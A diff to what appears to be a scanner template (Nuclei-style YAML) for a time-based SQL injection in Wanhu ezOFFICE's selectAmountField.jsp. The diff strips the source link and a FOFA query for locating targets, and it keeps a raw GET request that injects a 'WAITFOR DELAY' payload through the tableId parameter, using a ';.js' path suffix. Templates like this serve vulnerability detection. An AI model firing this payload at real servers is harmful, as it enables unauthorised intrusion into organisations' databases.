@@ -3,12 +3,8 @@ info:
   name: 万户 ezOFFICE selectAmountField  SQL 注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wq2g58ikgkthx9kl'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wq2g58ikgkthx9kl
-    fofa: app="万户网络-ezOFFICE"
 http:
 - raw:
   - 'GET /defaultroot/platform/custom/custom_database/dropdownselect/selectAmountField.jsp;.js?tableId=11%20Waitfor%20delay%20''0:0:5''%20%2d%2d%20 HTTP/1.1
